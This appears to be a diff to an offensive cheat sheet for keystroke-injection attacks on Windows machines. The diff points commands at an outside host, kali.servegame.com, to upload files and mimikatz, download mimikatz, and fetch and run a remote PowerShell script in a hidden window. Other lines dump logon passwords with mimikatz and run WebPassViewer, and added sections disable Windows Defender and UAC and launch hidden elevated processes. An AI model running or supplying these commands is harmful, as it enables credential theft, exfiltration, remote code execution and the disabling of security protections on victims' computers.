@@ -7,6 +7,8 @@ Extra commands
 
 \WINKEY #Windows key
 
+\DESKTOP #Shows Windows Desktop menu
+
 \CTRL
 
 \ALT
@@ -35,15 +37,15 @@ Extra commands
 
 iwr kali.servegame.com:8000/up.php -method POST -infile 64.txt
 
-Invoke-RestMethod -Uri "http://192.168.1.10:8000/up.php" -Method Post -InFile "C:\mimikatz32.exe"
+Invoke-RestMethod -Uri "http://kali.servegame.com:8000/up.php" -Method Post -InFile "C:\mimikatz32.exe"
 
 #Download file
 
 powershell.exe -executionpolicy bypass -w hidden #to hide window
 
-iex(New-Object System.Net.WebClient).DownloadString('http://192.168.1.10:8000/powershell.ps1')
+iex(New-Object System.Net.WebClient).DownloadString('http://kali.servegame.com:8000/powershell.ps1')
 
-Invoke-WebRequest -Uri "http://192.168.1.10:8000/mimikatz32.exe" -OutFile "C:\mimikatz32.exe"
+Invoke-WebRequest -Uri "http://kali.servegame.com:8000/mimikatz32.exe" -OutFile "C:\mimikatz32.exe"
 
 
 Password stealer with mimikatz##
@@ -54,3 +56,33 @@ mimikatz64.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > C:\nice.tx
 Pasword stealer with WebPassViewer
 
 ./webpass /stext pass.txt
+
+
+##Disable windows defender with powershell
+
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -name 'DisableAntiSpyware' -value 1
+
+
+##Disable UAC with powershell
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -name 'EnableLUA' -value 0
+
+or manually,
+C:\WINDOWS\System32\UserAccountControlSettings.exe
+(Tab)
+(Down arrow)
+(Down arrow)
+(Tab)
+(Enter)
+(Alt)
+(Y)
+
+
+#Enable Powershell executionpolicy
+
+Set-ItemProperty -path "HKLM:\SOFTWARE\Microsoft\PowerShell\1\ShellIds\Microsoft.PowerShell" -name 'ExecutionPolicy' -value 'RemoteSigned'
+
+
+
+#Start process with admin
+
+powershell -windowsstyle hidden Start-Process (command) -windowstyle hidden -verb runas
